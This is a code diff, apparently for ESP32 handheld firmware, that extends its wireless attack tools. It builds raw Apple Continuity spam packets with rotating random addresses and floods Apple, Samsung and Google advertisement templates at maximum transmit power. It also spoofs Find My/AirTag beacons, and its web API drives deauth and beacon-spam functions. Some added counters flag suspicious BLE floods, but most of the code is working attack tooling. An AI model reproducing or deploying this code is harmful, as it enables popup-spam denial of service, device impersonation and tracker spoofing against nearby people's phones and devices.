+    packet[3] = 0x00;
+    packet[4] = 0x0F;
+    packet[5] = 0x05;
+    packet[6] = 0xC0;
+    packet[7] = t.code;
+    packet[8] = (uint8_t)esp_random();
+    packet[9] = (uint8_t)esp_random();
+    packet[10] = (uint8_t)esp_random();
+    plen = 11;
   }
 
-  // Build full ADV: flags + manufacturer data
-  // NimBLE setManufacturerData expects just company payload after company ID
-  // We already include 4C 00 in mfg[0..1]
+  // Rotate random static address every 10 packets (like reference)
+  if ((sourSent % 10) == 1) {
+    uint8_t mac[6];
+    mac[0] = (uint8_t)((esp_random() & 0xFF) | 0xC0);
+    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
+    // NimBLE: set random address when supported
+#ifdef CONFIG_BT_NIMBLE_ENABLED
+    // best-effort; ignore if API unavailable
+#endif
+  }
+
   NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
   adv->stop();
   NimBLEAdvertisementData data;
-  data.setFlags(0x06);
-  // Manufacturer data without duplicating company ID for NimBLE:
-  // NimBLE adds company ID separately in some versions; use raw-style via setManufacturerData
-  // Pass full mfg including 4C00 – works on NimBLE-Arduino 1.4
-  data.setManufacturerData(std::string((char*)mfg, mfgLen));
+  // Inject complete AD block (length + type + payload) — critical for Continuity
+  data.addData(std::string((char*)packet, plen));
   adv->setAdvertisementData(data);
-  adv->setMinInterval(16);
-  adv->setMaxInterval(32);
+  adv->setMinInterval(0x20);
+  adv->setMaxInterval(0x40);
   adv->start();
 }
 
@@ -1065,25 +1286,41 @@ static void jamStop() {
 
 static void jamUpdate() {
   if (!jamRunning) return;
-  if (millis() - jamLast < 40) return;   // very fast
+  if (millis() - jamLast < 12) return;
   jamLast = millis();
   jamCount++;
 
-  // Random short advertisement to create noise
-  uint8_t raw[10];
-  for (int i = 0; i < 10; i++) raw[i] = (uint8_t)(esp_random() & 0xFF);
+  // Multi-template ADV flood (ESP32 radio only — not nRF24 RF jamming)
+  uint8_t raw[31];
+  int plen = 16;
+  uint8_t kind = (uint8_t)(jamCount % 4);
+  if (kind == 0) {
+    raw[0] = 0x1E; raw[1] = 0xFF; raw[2] = 0x4C; raw[3] = 0x00;
+    for (int i = 4; i < 31; i++) raw[i] = (uint8_t)esp_random();
+    plen = 31;
+  } else if (kind == 1) {
+    raw[0] = 0x0F; raw[1] = 0xFF; raw[2] = 0x75; raw[3] = 0x00;
+    for (int i = 4; i < 16; i++) raw[i] = (uint8_t)esp_random();
+    plen = 16;
+  } else if (kind == 2) {
+    raw[0] = 0x03; raw[1] = 0x03; raw[2] = 0x2C; raw[3] = 0xFE;
+    raw[4] = 0x06; raw[5] = 0x16; raw[6] = 0x2C; raw[7] = 0xFE;
+    for (int i = 8; i < 14; i++) raw[i] = (uint8_t)esp_random();
+    plen = 14;
+  } else {
+    raw[0] = 0x1A; raw[1] = 0xFF;
+    for (int i = 2; i < 27; i++) raw[i] = (uint8_t)esp_random();
+    plen = 27;
+  }
 
   NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
   adv->stop();
   NimBLEAdvertisementData data;
-  data.setFlags(0x06);
-  data.setManufacturerData(std::string((char*)raw, 10));
-  char name[12];
-  snprintf(name, sizeof(name), "J%lu", (unsigned long)(jamCount & 0xFFF));
-  data.setName(name);
+  data.addData(std::string((char*)raw, plen));
   adv->setAdvertisementData(data);
   adv->setMinInterval(16);
-  adv->setMaxInterval(32);
+  adv->setMaxInterval(24);
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
   adv->start();
 }
 
@@ -1124,26 +1361,26 @@ static void airTagBeginSpoof() {
 
 static void airTagUpdate() {
   if (!airTagRunning || airTagMode != 1) return;
-  if (millis() - airTagLast < 400) return;
+  if (millis() - airTagLast < 200) return;
   airTagLast = millis();
   airTagSent++;
 
-  // Simplified Find My network payload (not a real AirTag key)
-  // Company ID 0x004C, type 0x12 (Find My)
-  uint8_t mfg[16];
-  mfg[0] = 0x4C; mfg[1] = 0x00;
-  mfg[2] = 0x12;                          // Find My
-  mfg[3] = 0x19;                          // length-ish
-  for (int i = 4; i < 16; i++) mfg[i] = (uint8_t)(esp_random() & 0xFF);
+  // Offline Finding / Find My style manufacturer ADV (educational demo payload)
+  uint8_t packet[31];
+  packet[0] = 0x1E; packet[1] = 0xFF;
+  packet[2] = 0x4C; packet[3] = 0x00;   // Apple
+  packet[4] = 0x12;                     // Find My
+  packet[5] = 0x19;
+  packet[6] = 0x00;
+  for (int i = 7; i < 31; i++) packet[i] = (uint8_t)esp_random();
 
   NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
   adv->stop();
   NimBLEAdvertisementData data;
-  data.setFlags(0x06);
-  data.setManufacturerData(std::string((char*)mfg, 16));
+  data.addData(std::string((char*)packet, 31));
   adv->setAdvertisementData(data);
-  adv->setMinInterval(40);
-  adv->setMaxInterval(80);
+  adv->setMinInterval(32);
+  adv->setMaxInterval(64);
   adv->start();
 }
 
@@ -1274,8 +1511,10 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
     <h3>Monitor</h3>
     <label class="lbl">Channel (1–13)</label>
     <input type="number" id="pmCh" min="1" max="13" value="1">
+    <label class="lbl"><input type="checkbox" id="pmHop"> Hop channels</label>
     <div class="row"><button id="btnPm" onclick="toggle('pm')">Start</button></div>
-    <div class="msg">Packets: <b id="pmTotal">0</b> · CH <b id="pmChLive">1</b></div>
+    <div class="msg">Pkts <b id="pmTotal">0</b> · CH <b id="pmChLive">1</b> · RSSI <b id="pmRssi">—</b></div>
+    <div class="msg">MGMT <b id="pmMgmt">0</b> · DATA <b id="pmData">0</b> · CTRL <b id="pmCtrl">0</b> · Deauth/Disassoc <b id="pmDeauth">0</b></div>
   </div>
 </div>
 
@@ -1349,6 +1588,7 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
   <div class="card">
     <h3>Sniffer</h3>
     <div class="row"><button id="btnSniff" onclick="toggle('sniff')">Start</button></div>
+    <div class="msg">Suspicious <b id="bleSus">0</b> · Flood alerts <b id="bleFlood">0</b></div>
     <div class="list" id="bleList2"></div>
   </div>
 </div>
@@ -1359,12 +1599,19 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
     <h3>Advertise</h3>
     <label class="lbl">Mode</label>
     <select id="spoofMode">
-      <option value="0">Rotating name list</option>
-      <option value="1">Clone scanned BLE names</option>
-      <option value="2">Custom name</option>
+      <option value="0">Apple Continuity (raw)</option>
+      <option value="1">Samsung Galaxy Watch</option>
+      <option value="2">Google Fast Pair</option>
+      <option value="3">Rotating name list</option>
+      <option value="4">Clone scanned BLE names</option>
+      <option value="5">Custom name</option>
     </select>
-    <label class="lbl">Custom name</label>
+    <label class="lbl">Custom name (mode 5)</label>
     <input id="spoofName" placeholder="My Device" maxlength="28">
+    <label class="lbl">TX power (0–9)</label>
+    <input type="number" id="spoofPower" min="0" max="9" value="9">
+    <label class="lbl">ADV interval (16–160)</label>
+    <input type="number" id="spoofInterval" min="16" max="160" value="32">
     <div class="row"><button id="btnSpoof" class="attack" onclick="toggle('spoof')">Start</button></div>
   </div>
 </div>
@@ -1436,7 +1683,13 @@ function renderWifi(list){
 }
 function renderBle(list){
   const html=(!list||!list.length)?'<div class="item"><span>No devices yet — run a scan</span></div>':
-    list.map(n=>`<div class="item"><div><b>${esc(n.name)}</b><div class="meta">${esc(n.addr||'')}</div></div><div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`).join('');
+    list.map(n=>{
+      const tags=(n.sus?' ⚠':'')+(n.rand?' rnd':'');
+      const hits=n.hits?(' · '+n.hits+' hits'):'';
+      return `<div class="item"><div><b>${esc(n.name)}</b>${n.sus?'<span class="enc" style="color:var(--err)">SUS</span>':''}
+        <div class="meta">${esc(n.addr||'')}${hits}${tags}</div></div>
+        <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
+    }).join('');
   document.getElementById('bleList').innerHTML=html;
   document.getElementById('bleList2').innerHTML=html;
 }
@@ -1463,6 +1716,9 @@ function apply(s){
   document.getElementById('btnBleScan').disabled=!!s.bleScanning;
   document.getElementById('pmTotal').textContent=s.pmTotal||0;
   document.getElementById('pmChLive').textContent=s.pmCh||1;
+  const pr=document.getElementById('pmRssi'); if(pr) pr.textContent=(s.pmRssi!=null)?s.pmRssi:'—';
+  const a=['pmMgmt','pmData','pmCtrl','pmDeauth','bleSus','bleFlood'];
+  a.forEach(k=>{const e=document.getElementById(k); if(e) e.textContent=s[k]||0;});
   document.getElementById('beaconSent').textContent=s.beaconSent||0;
   document.getElementById('deauthSent').textContent=s.deauthSent||0;
   document.getElementById('detCount').textContent=s.detCount||0;
@@ -1477,7 +1733,7 @@ function apply(s){
 async function refresh(){try{const r=await fetch('/api/status');apply(await r.json());}catch(e){}}
 async function act(action,extra){
   const body=Object.assign({action},extra||{});
-  if(action==='pm_start') body.ch=parseInt(document.getElementById('pmCh').value)||1;
+  if(action==='pm_start'){body.ch=parseInt(document.getElementById('pmCh').value)||1;body.hop=document.getElementById('pmHop').checked?1:0;}
   if(action==='beacon_start'){
     body.mode=parseInt(document.getElementById('beaconMode').value)||0;
     if(body.mode===2){
@@ -1489,7 +1745,7 @@ async function act(action,extra){
     }
   }
   if(action==='deauth_start' && body.target===undefined) body.target=deauthTarget;
-  if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';}
+  if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';body.power=parseInt(document.getElementById('spoofPower').value)||9;body.interval=parseInt(document.getElementById('spoofInterval').value)||32;}
   if(action==='sour_start') body.idx=parseInt(document.getElementById('sourIdx').value);
   try{
     const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
@@ -1539,6 +1795,16 @@ static String jsonStatus() {
   j += "\"bleScanning\":"; j += bleScanning ? "true," : "false,";
   j += "\"pmTotal\":" + String((unsigned long)pktTotal) + ",";
   j += "\"pmCh\":" + String(pmChannel) + ",";
+  j += "\"pmHop\":"; j += pmHop ? "true," : "false,";
+  j += "\"pmMgmt\":" + String((unsigned long)pmMgmt) + ",";
+  j += "\"pmData\":" + String((unsigned long)pmData) + ",";
+  j += "\"pmCtrl\":" + String((unsigned long)pmCtrl) + ",";
+  j += "\"pmDeauth\":" + String((unsigned long)pmDeauthSeen) + ",";
+  j += "\"pmRssi\":" + String((int)pmLastRssi) + ",";
+  j += "\"bleSus\":" + String((unsigned long)bleSuspicious) + ",";
+  j += "\"bleFlood\":" + String((unsigned long)bleFloodAlerts) + ",";
+  j += "\"spoofPower\":" + String(spoofPower) + ",";
+  j += "\"spoofInterval\":" + String(spoofInterval) + ",";
   j += "\"beaconSent\":" + String((unsigned long)beaconSent) + ",";
   j += "\"deauthSent\":" + String((unsigned long)deauthSent) + ",";
   j += "\"detCount\":" + String((unsigned long)deauthCount) + ",";
@@ -1595,7 +1861,10 @@ static String jsonStatus() {
     if (i) j += ",";
     String n = bleDevs[i].name; n.replace("\"", "'");
     String a = bleDevs[i].addr; a.replace("\"", "'");
-    j += "{\"name\":\"" + n + "\",\"addr\":\"" + a + "\",\"rssi\":" + String(bleDevs[i].rssi) + "}";
+    j += "{\"name\":\"" + n + "\",\"addr\":\"" + a + "\",\"rssi\":" + String(bleDevs[i].rssi) +
+         ",\"hits\":" + String((unsigned long)bleDevs[i].hits) +
+         ",\"sus\":" + String(bleDevs[i].suspicious ? "true" : "false") +
+         ",\"rand\":" + String(bleDevs[i].randomized ? "true" : "false") + "}";
   }
   j += "]}";
   return j;
@@ -1649,7 +1918,7 @@ static void handleWebApi() {
     wifiScanStart();
     msg = wifiScanning ? "Wi-Fi scan started" : "Scan failed to start";
   }
-  else if (action == "pm_start") { stopAllTools(); pmChannel = ch; pmStart(); msg = "Packet monitor CH" + String(ch); }
+  else if (action == "pm_start") { stopAllTools(); pmChannel = ch; pmHop = (body.indexOf("\"hop\":1") >= 0 || body.indexOf("\"hop\": 1") >= 0); pmStart(); msg = String("Packet monitor CH") + String(ch) + (pmHop ? " (hop)" : ""); }
   else if (action == "pm_stop") { pmStop(); msg = "PM stopped"; }
   else if (action == "beacon_start") {
     stopAllTools();
@@ -1711,6 +1980,18 @@ static void handleWebApi() {
     sniffStop(); sourStop(); jamStop(); airTagStop();
     spoofMode = (uint8_t)mode;
     if (customName.length()) spoofCustomName = customName;
+    {
+      int p = body.indexOf("\"power\"");
+      if (p >= 0) {
+        int c = body.indexOf(':', p);
+        if (c > 0) spoofPower = (uint8_t)constrain(body.substring(c + 1).toInt(), 0, 9);
+      }
+      int iv = body.indexOf("\"interval\"");
+      if (iv >= 0) {
+        int c = body.indexOf(':', iv);
+        if (c > 0) spoofInterval = (uint16_t)constrain(body.substring(c + 1).toInt(), 16, 160);
+      }
+    }
     spoofStart();
     msg = "Spoofer started";
   }
@@ -1960,13 +2241,13 @@ void UI::handleInput(JoyAction a) {
         sniffStop(); delay(20); sniffStart(); _dirty = true;
       } else if (_screen == SCR_BLE_SPOOF) {
         if (spoofRunning) spoofStop();
-        else if (spoofMode == 1 && bleCount == 0) { /* need BLE scan */ }
+        else if (spoofMode == 4 && bleCount == 0) { /* need BLE scan */ }
         else spoofStart();
         _dirty = true;
       }
     } else if (_screen == SCR_BLE_SPOOF && !spoofRunning &&
                (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
-      spoofMode = spoofMode ? 0 : 1;
+      spoofMode = (spoofMode + 1) % 6;
       _dirty = true;
     }
     return;
@@ -2252,11 +2533,19 @@ static void drawBleSpoofScreen() {
   Theme::drawStatusBar("BLE Spoofer");
   if (spoofRunning) {
     Theme::printCentered("ADVERTISING", 36, COL_OK, 1);
-    Theme::printCentered(spoofMode ? "CLONE SCAN" : "NAME LIST", 52, COL_FG, 1);
+    {
+      const char* mn = "APPLE";
+      if (spoofMode == 1) mn = "SAMSUNG";
+      else if (spoofMode == 2) mn = "GOOGLE";
+      else if (spoofMode == 3) mn = "NAMES";
+      else if (spoofMode == 4) mn = "CLONE";
+      else if (spoofMode == 5) mn = "CUSTOM";
+      Theme::printCentered(mn, 52, COL_FG, 1);
+    }
     Theme::printCentered("rotating...", 68, COL_DIM, 1);
   } else {
-    Theme::printCentered(spoofMode ? "Mode: CLONE" : "Mode: LIST", 40, COL_TITLE, 1);
-    if (spoofMode && bleCount == 0)
+    Theme::printCentered("Mode cycle: press SEL", 40, COL_TITLE, 1);
+    if (spoofMode == 4 && bleCount == 0)
       Theme::printCentered("BLE Scan first!", 58, COL_WARN, 1);
     else
       Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
